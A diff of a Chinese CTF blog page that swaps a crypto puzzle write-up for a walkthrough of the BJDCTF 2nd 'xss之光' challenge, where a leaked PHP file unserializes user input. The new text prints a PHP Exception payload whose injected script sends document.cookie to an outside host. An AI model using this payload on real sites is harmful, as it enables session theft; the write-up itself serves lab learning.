@@ -5,7 +5,7 @@
     
 <meta charset="utf-8" >
 
-<title>[XMAN2018排位赛]通行证 | ev11ccaatt</title>
+<title>[BJDCTF 2nd]xss之光 | ev11ccaatt</title>
 <meta name="description" content="人菜多学">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -80,37 +80,37 @@
       <div class="content-container">
         <div class="post-detail">
           
-          <h2 class="post-title">[XMAN2018排位赛]通行证</h2>
+          <h2 class="post-title">[BJDCTF 2nd]xss之光</h2>
           <div class="post-info post-detail-info">
-            <span><i class="icon-calendar-outline"></i> 2021-03-25</span>
+            <span><i class="icon-calendar-outline"></i> 2021-04-06</span>
             
           </div>
           <div class="post-content">
-            <p>这道题是水的一题</p>
-<p>这两天身体不舒服，水一下。</p>
-<p>下载</p>
-<pre><code>a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg==
+            <p>进去没有信息，抓个包看下，当时第一是发现 Server: openresty 找了几个payload看了下，貌似不是这里。</p>
+<p>那么还是老办法吧，扫目录。</p>
+<p>开奖了，有git文件泄露.</p>
+<p>发现就一个文件</p>
+<pre><code>&lt;?php
+$a = $_GET['yds_is_so_beautiful'];
+echo unserialize($a);
 </code></pre>
-<p>base64解密</p>
-<pre><code>kanbbrgghjl{zb____}vtlaln
+<p>一番搜索发现是php原生类的利用,<a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html">反序列化之PHP原生类的利用</a></p>
+<p>由于是php5.6那么构造</p>
+<pre><code>&lt;?php
+$a = new Exception(&quot;&lt;script&gt;window.open('http://99cb3fc4-b241-4edb-aa24-b550de1ef186.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;&quot;);
+$b = serialize($a);
+echo urlencode($b);
 </code></pre>
-<p>这里卡了一会，以为要翻转，但翻过来明显不对劲，考虑下栅栏.</p>
-<p>在cyberchef试了下，竟然不是解密而是加密，key为7.</p>
-<pre><code>kzna{blnl_abj_lbh_trg_vg}
-</code></pre>
-<p>最后一步很明显了凯撒移位。（https://planetcalc.com/1434/）</p>
-<pre><code>ROT13	xman{oyay_now_you_get_it}
-</code></pre>
-<p>收工，睡觉.</p>
+<p>即可，传入后在cookie可以看到flag.</p>
 
           </div>
         </div>
 
         
           <div class="next-post">
-            <a class="purple-link" href="https://ev11ccaatt.github.io/post/csawqual-2019web_unagi/">
+            <a class="purple-link" href="https://ev11ccaatt.github.io/post/bjdctf-2ndjian-dan-zhu-ru/">
               <h3 class="post-title">
-                下一篇：[CSAWQual 2019]Web_Unagi
+                下一篇：[BJDCTF 2nd]简单注入
               </h3>
             </a>
           </div>
